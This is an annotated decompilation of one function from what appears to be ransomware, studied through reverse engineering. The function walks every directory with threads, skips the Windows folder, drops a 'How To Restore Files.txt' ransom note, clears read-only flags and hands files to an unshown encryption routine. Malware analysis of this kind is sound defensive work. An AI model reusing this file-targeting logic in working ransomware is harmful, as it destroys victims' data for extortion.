/* Given a file name (of the form "\\?\A:\*.*" at first), iterates over every file on the directory.
If it's a subdirectory, it creates a thread of FUN_004013e3
Else if it's a file, calls FUN_00401000 abd FUN_00401292.
*/
void FUN_004013e3(LPCWSTR lpFileName)

{
  int ret_value;
  LPWSTR heap;
  uint uVar3;
  BOOL next;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar5;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar6;
  undefined4 *puVar7;
  _MEMORYSTATUS memoryStatus;
  HANDLE hFindFile;
  undefined lpFindFileData [44];
  WCHAR local_22c [274];
  
  /* Searches a directory for a file or subdirectory with a name that matches a specific name 
     [in] LPCWSTR lpFileName : The directory or path, and the file name
     [out] LPWIN32_FIND_DATAW lpFindFileData : A pointer to the WIN32_FIND_DATA structure that receives information about a found file or directory.

      typedef struct _WIN32_FIND_DATAA {
        DWORD    dwFileAttributes; // The file attributes of a file.
        FILETIME ftCreationTime;
        FILETIME ftLastAccessTime;
        FILETIME ftLastWriteTime;
        DWORD    nFileSizeHigh;   // The high-order DWORD value of the file size, in bytes.
        DWORD    nFileSizeLow;    // The low-order DWORD value of the file size, in bytes.
        DWORD    dwReserved0;
        DWORD    dwReserved1;
        CHAR     cFileName[MAX_PATH]; // The name of the file.
        CHAR     cAlternateFileName[14];
        DWORD    dwFileType;
        DWORD    dwCreatorType;
        WORD     wFinderFlags;
      } WIN32_FIND_DATAA, *PWIN32_FIND_DATAA, *LPWIN32_FIND_DATAA;

  Return value : If the function succeeds, the return value is a search handle used in a subsequent call to FindNextFile or FindClose, and the lpFindFileData parameter contains information about the first file or directory found.
  */
  HANDLE hSearch = FindFirstFileW(lpFileName,(LPWIN32_FIND_DATAW)lpFindFileData);

  // hSearch equals 0xffffffff if there is no files or directories find
  if (hSearch != (HANDLE)0xffffffff) {
    do {
      local_25c = hSearch;
      
      // If it's not a directery (0x10 == FILE_ATTRIBUTE_DIRECTORY)
      if ((lpFindFileData.dwFileAttributes & 0x10) == 0) { 

        if ((lpFindFileData.nFileSizeHigh != 0) || (0x1f < lpFindFileData.nFileSizeLow)) {
          uVar3 = lpFindFileData.nFileSizeLow;

          if (lpFindFileData.nFileSizeHigh != 0) {
            uVar3 = 0x100000;
          }

          lpFileName[98400] = uVar3;

          /* Compares two character strings. The comparison is not case-sensitive.
              [in] LPCWSTR lpString1 : The first null-terminated string to be compared.
              [in] LPCWSTR lpString2 : The second null-terminated string to be compared.

              Return value : If the string pointed to by lpString1 is less than the string pointed to by lpString2, the return value is negative. If the string pointed to by lpString1 is greater than the string pointed to by lpString2, the return value is positive. If the strings are equal, the return value is zero.
           */
          ret_value = lstrcmpiW("How To Restore Files.txt", lpFindFileData.cFileName);

          // If the filename is not "How To Restore Files.txt" 
          if (ret_value != 0) {
            // Creates "How To Restore Files.txt" at the root of the directory contained in lpFileName
            FUN_00401000(lpFileName); 

            /* Determines the length of the specified string (not including the terminating null character).
                [in] LPCWSTR lpString : The null-terminated string to be checked.

                Return value : The function returns the length of the string, in characters. If lpString is NULL, the function returns 0.
            */
            uVar3 = lstrlenW(lpFindFileData.cFileName);
            
            // Only file name with length less than 21 are crypted
            // Compares two character strings. The comparison is not case-sensitive.
            if ((uVar3 < 0x15) || (ret_value = lstrcmpiW(".BI_D",(LPCWSTR)(lpFindFileData + uVar3 * 2 + 0x22)), ret_value != 0)) {
              
              /* Appends one string to another.
                [in, out] LPWSTR  lpString1 : The first null-terminated string. This buffer must be large enough to contain both strings.
                [in] LPCWSTR lpString2 : The null-terminated string to be appended to the string specified in the lpString1 parameter.

                Return value : If the function succeeds, the return value is a pointer to the buffer.
              */
              lstrcatW(lpFileName + 0x4010,lpFileName);
              
              // Determines the length of the specified string (not including the terminating null character).
              ret_value = lstrlenW(lpFileName + 0x4010);
              *(undefined4 *)(lpFileName + ret_value + 0x400d) = 0; // Terminate the copied string by null char

              // Appends one string to another.
              lstrcatW(lpFileName + 0x4010,local_22c); // file name
              lstrcatW(lpFileName + 0x8020,lpFileName + 0x4010); // disk device 
              lstrcatW(lpFileName + 0x8020, " id-"); // 

              uVar5 = extraout_ECX;
              uVar6 = extraout_EDX;

              // If the file is read only (1 == FILE_ATTRIBUTE_READONLY) then change it's attribute to 0x80 (FILE_ATTRIBUTE_NORMAL)
              if ((lpFindFileData.dwFileAttributes & 1) != 0) {

                /* Sets the attributes for a file or directory. 
                  [in] LPCWSTR lpFileName : The name of the file whose attributes are to be set.
                  [in] DWORD dwFileAttributes (0x80 == FILE_ATTRIBUTE_NORMAL == A file that does not have other attributes set) : The file attributes to set for the file.
                */
                SetFileAttributesW(lpFileName + 0x4010,0x80);
                uVar5 = extraout_ECX_00;
                uVar6 = extraout_EDX_00;
              }

              // ex: FUN_00401292( , ,"\\\\?\\C:\\bootmgr")
              FUN_00401292(uVar5,uVar6,lpFileName + 0x4010);
            }
          }
        }
      }
      else {
        /* Compares two character strings. The comparison is case-sensitive.
          [in] LPCWSTR lpString1 : The first null-terminated string to be compared.
          [in] LPCWSTR lpString2 : The second null-terminated string to be compared.
        
          Return value : If the string pointed to by lpString1 is less than the string pointed to by lpString2, the return value is negative. If the string pointed to by lpString1 is greater than the string pointed to by lpString2, the return value is positive. If the strings are equal, the return value is zero.
        */

        // DAT_00404056 == "V@@" && DAT_00404054 == ".."
        if (((ret_value = lstrcmpW((LPCWSTR)&DAT_00404056,lpFindFileData.cFileName), ret_value != 0) && 
             (ret_value = lstrcmpW((LPCWSTR)&DAT_00404054,lpFindFileData.cFileName), ret_value != 0)) &&
             (ret_value = lstrcmpiW("windows",lpFindFileData.cFileName), ret_value != 0)) {
          
          /* Allocates the specified number of bytes from the heap.
            [in] UINT uFlags = 0x40 : GMEM_ZEROINIT (Initializes memory contents to zero)
            [in] dbBytes = 0x18064 : The number of bytes to allocate 
            
            Return value : If the function succeeds, the return value is a handle to the newly allocated memory object.
          */
          while (heap = (LPWSTR)GlobalAlloc(0x40,0x18064), heap == (LPWSTR)0x0) {
            Sleep();
          }

          // Add fileName to the heap 
          lstrcatW(heap,lpFileName);

          // Determines the length of the specified string (not including the terminating null character).
          ret_value = lstrlenW(heap);

          // Adding terminating null character 3 byte before (ex: from "\\?\A:\*.*", to "\\?\A:\")
          heap[ret_value - 3] = 0;

          // Appends file name to the the disk drive. (ex: "\\\\?\\A:\\$RECYCLE.BIN")
          lstrcatW(heap,lpFindFileData.cFileName);

          // Determines the length of the specified string (not including the terminating null character).
          ret_value = lstrlenW(heap);

          heap[ret_value] = 0x2a005c; // '*\'
          heap[ret_value + 2] = 0x2a002e; // '*.'
          heap[ret_value + 4] = '\0';
          // heap now contains for instance : ""\\\\?\\A:\\$RECYCLE.BIN\\*.*"

          if (100 < DAT_00404b44) {
            memoryStatus.dwLength = 0x20; // The size of the MEMORYSTATUS data structure, in bytes.

            /* Retrieves information about the system's current usage of both physical and virtual memory.
                [out] LPMEMORYSTATUS lpBuffer : A pointer to a MEMORYSTATUS structure. The GlobalMemoryStatus function stores information about current memory availability into this structure.

                typedef struct _MEMORYSTATUS {
                  DWORD  dwLength;
                  DWORD  dwMemoryLoad; // A number between 0 and 100 that specifies the approximate percentage of physical memory that is in use (0 indicates no memory use and 100 indicates full memory use).
                  SIZE_T dwTotalPhys;
                  SIZE_T dwAvailPhys;
                  SIZE_T dwTotalPageFile;
                  SIZE_T dwAvailPageFile;
                  SIZE_T dwTotalVirtual;
                  SIZE_T dwAvailVirtual;
                } MEMORYSTATUS, *LPMEMORYSTATUS;

                Return value : None
            */
            while (GlobalMemoryStatus((LPMEMORYSTATUS)&memoryStatus), 0x55 < memoryStatus.dwMemoryLoad) {
              Sleep();
            }
          }

          DAT_00404b44 = DAT_00404b44 + 1;

        /* Creates a thread to execute within the virtual address space of the calling process.
          [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes : A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle can be inherited by child processes. If lpThreadAttributes is NULL, the handle cannot be inherited.
          [in] SIZE_T dwStackSize : The initial size of the stack, in bytes. The system rounds this value to the nearest page. If this parameter is zero, the new thread uses the default size for the executable. 
          [in] LPTHREAD_START_ROUTINE  lpStartAddress : A pointer to the application-defined function to be executed by the thread. This pointer represents the starting address of the thread. 
          [in, optional] __drv_aliasesMem LPVOID lpParameter : A pointer to a variable to be passed to the thread.
          [in] DWORD dwCreationFlags : The flags that control the creation of the thread. If 0, the thread runs immediately after creation.
          [out, optional] LPDWORD lpThreadId : A pointer to a variable that receives the thread identifier. 
            
          Return value : If the function succeeds, the return value is a handle to the new thread.
        */
          CreateThread((LPSECURITY_ATTRIBUTES)0x0,64000,FUN_004013e3,heap,0,(LPDWORD)&heap);
        }
      }

      puVar7 = (undefined4 *)(lpFileName + 0x4010);

      for (ret_value = 0x4011; ret_value != 0; ret_value--) {
        *puVar7 = 0;
        puVar7++;
      }

      /* Continues a file search from a previous call to the FindFirstFile, FindFirstFileEx, or FindFirstFileTransacted functions.
        [in]  HANDLE hFindFile : The search handle returned by a previous call to the FindFirstFile or FindFirstFileEx function.
        [out] LPWIN32_FIND_DATAW lpFindFileData : A pointer to the WIN32_FIND_DATA structure that receives information about the found file or subdirectory.

        Return value : If the function succeeds, the return value is nonzero and the lpFindFileData parameter contains information about the next file or directory found.
                       If the function fails, the return value is zero and the contents of lpFindFileData are indeterminate.
      */
      next = FindNextFileW(hFindFile,(LPWIN32_FIND_DATAW)lpFindFileData);

      hSearch = hFindFile;

    } while (next != 0);
    FindClose(hFindFile);
  }

  /* Frees the specified global memory object and invalidates its handle.
    [in] _Frees_ptr_opt_ HGLOBAL hMem : A handle to the global memory object. This handle is returned by either the GlobalAlloc or GlobalReAlloc function.

    Return value : If the function succeeds, the return value is NULL.
                   If the function fails, the return value is equal to a handle to the global memory object.
  */
  GlobalFree(lpFileName);
  DAT_00404b44 = DAT_00404b44 - 1;
  
  return;
}
